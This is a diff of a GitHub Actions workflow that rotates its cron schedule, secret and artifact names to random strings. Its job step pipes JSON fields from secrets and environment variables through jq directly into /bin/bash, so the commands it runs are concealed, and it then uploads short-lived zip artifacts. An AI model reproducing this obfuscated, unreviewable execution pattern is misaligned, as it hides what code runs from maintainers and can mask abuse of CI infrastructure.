@@ -3,7 +3,7 @@ on:
   workflow_dispatch:
 
   schedule:
-    - cron: '50 5,11,17,23 * * *'
+    - cron: '26 2,8,14,20 * * *'
 env:
   CI: true
 concurrency:
@@ -16,16 +16,17 @@ jobs:
       - uses: actions/checkout@v4
       - name: Go
         env:
-          ls13: ${{ secrets.ls13 }}
+          qnxq8365: ${{ secrets.qnxq8365 }}
         run: |
-          printf '%s' "$ls13" | jq -r .cgjt425 | /bin/bash
-          printf '%s' "$p679" | jq -r .v7 | /bin/bash
-          printf '%s' "$osfa1238" | jq -r .hxojh1246 | /bin/bash
-          printf '%s' "$c7181" | jq -r .ryzx4110 | /bin/bash
+          printf '%s' "$qnxq8365" | jq -r .dg39845 | /bin/bash
+          echo $lw8906 | jq -r .tl76 | /bin/bash
+          echo $uyqp35 | jq -r .r53 | /bin/bash
+          printf '%s' "$qirrd4" | jq -r .ppidd4662 | /bin/bash
+          echo $zmbbx56 | jq -r .khjfv42549 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
         with:
-          name: LQrx76ma
+          name: wMFaJV0i
           path: "*.zip"
           retention-days: 1
